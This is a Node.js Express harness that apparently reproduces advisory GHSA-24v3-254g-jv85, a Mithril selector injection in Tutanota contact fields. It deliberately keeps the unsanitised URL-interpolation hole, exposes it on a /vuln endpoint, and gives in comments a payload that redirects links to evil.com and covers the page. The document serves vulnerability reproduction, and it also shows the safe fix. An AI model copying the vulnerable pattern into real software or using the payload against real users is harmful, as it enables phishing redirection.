/**
 * Carrier app for GHSA-24v3-254g-jv85
 * Demonstrates Mithril hyperscript CSS selector injection via unsanitized
 * contact field values interpolated into m() selector strings.
 *
 * Vulnerable pattern (from ContactViewer.ts, pre-patch):
 *   m(`a[href=${getSocialUrl(contactSocialId)}][target=_blank]`, showButton)
 *
 * Attack payload example:
 *   ][href=https://evil.com][style=position:fixed;width:150vw;height:200vh;top:0;left:0
 */

const express = require("express");
const m = require("mithril/render/hyperscript");
const render = require("mithril-node-render");

// Load the vulnerable package (pinned at 314.251111.0)
// parseUrl is the utility added in the fix to validate URLs before interpolation
const tutanotaUtils = require("@tutao/tutanota-utils");

const app = express();
app.use(express.json());

// ── Replicate the OLD (vulnerable) getSocialUrl logic from ContactUtils.ts ──
// Pre-patch: directly concatenates socialId into a URL string with no validation.
// The returned string is then interpolated into a Mithril selector.
function getSocialUrl_vulnerable(socialId, type) {
  const http = "https://";
  const www = "www.";
  const isSchemePrefixed = socialId.indexOf("http") !== -1;
  const isWwwDotPrefixed = socialId.indexOf(www) !== -1;

  let socialUrlType = "";
  if (!isSchemePrefixed && !isWwwDotPrefixed) {
    switch (type) {
      case "twitter":   socialUrlType = "twitter.com/";  break;
      case "facebook":  socialUrlType = "facebook.com/"; break;
      case "xing":      socialUrlType = "xing.com/profile/"; break;
      case "linkedin":  socialUrlType = "linkedin.com/in/"; break;
    }
  }

  const scheme = isSchemePrefixed ? "" : http;
  const prefix = (isSchemePrefixed || isWwwDotPrefixed) ? "" : www;
  // Returns the raw socialId concatenated — no sanitization of ] [ = characters
  return `${scheme}${prefix}${socialUrlType}${socialId.trim()}`;
}

// ── Health endpoint ──────────────────────────────────────────────────────────
app.get("/health", (req, res) => {
  res.json({ status: "ok" });
});

// ── Vulnerable endpoint ──────────────────────────────────────────────────────
// Accepts a contact social ID value (or website URL / phone / address) and
// replicates the vulnerable Mithril selector string interpolation from
// ContactViewer.ts renderSocialId / renderWebsite / renderPhone / renderAddress.
//
// Example exploit input (social ID):
//   ][href=https://evil.com][style=position:fixed;width:150vw;height:200vh;top:0;left:0
//
// This causes Mithril to parse the selector as:
//   a[href=][href=https://evil.com][style=position:fixed;...][target=_blank]
// overriding the href and injecting arbitrary CSS.
app.all("/vuln", async (req, res) => {
  try {
    const body = req.method === "POST" ? req.body : {};
    const socialId = body.input ?? req.query.input ?? "https://twitter.com/user";
    const socialType = body.type ?? req.query.type ?? "twitter";

    // Step 1: Build the URL the same way the vulnerable getSocialUrl did
    const socialUrl = getSocialUrl_vulnerable(socialId, socialType);

    // Step 2: Replicate the EXACT vulnerable Mithril hyperscript call:
    //   m(`a[href=${getSocialUrl(contactSocialId)}][target=_blank]`, showButton)
    // The selector string is built with raw string interpolation — no escaping.
    const vulnerableSelector = `a[href=${socialUrl}][target=_blank]`;

    // Step 3: Call m() with the vulnerable selector (this is the attack surface)
    // mithril parses the selector string as a CSS selector, so injected
    // attribute tokens like ][href=https://evil.com][style=...] become real attrs.
    let vnode;
    let selectorError = null;
    try {
      vnode = m(vulnerableSelector, "Click me");
    } catch (e) {
      selectorError = e.message;
      vnode = m("span", `[selector parse error: ${e.message}]`);
    }

    // Step 4: Render the vnode to an HTML string so we can inspect the result
    const html = await render(vnode);

    // Step 5: Also show what parseUrl (from @tutao/tutanota-utils) returns
    // In the patched version, parseUrl(socialId) != null gates the URL usage.
    const parsedUrl = tutanotaUtils.parseUrl ? tutanotaUtils.parseUrl(socialId) : "(parseUrl not exported)";

    res.json({
      // The raw input social ID
      input_socialId: socialId,
      // The URL built by the vulnerable getSocialUrl
      built_url: socialUrl,
      // The full Mithril selector string (shows the injection)
      vulnerable_selector: vulnerableSelector,
      // The rendered HTML — shows injected attributes in the DOM
      rendered_html: html,
      // parseUrl result from @tutao/tutanota-utils (used in the fix)
      tutanota_parseUrl_result: parsedUrl ? String(parsedUrl) : null,
      // Any selector parse error
      selector_error: selectorError,
      // Demonstration of the fix (object-based attrs — safe)
      safe_equivalent: `m("a", { href: "${socialUrl}", target: "_blank" }, child)`,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ── Start server ─────────────────────────────────────────────────────────────
app.listen(9090, "0.0.0.0", () => {
  console.log("Carrier app listening on http://0.0.0.0:9090");
  console.log("  GET  /health");
  console.log("  POST /vuln  { input: '<socialId>', type: 'twitter' }");
  console.log("  GET  /vuln?input=<socialId>&type=twitter");
});
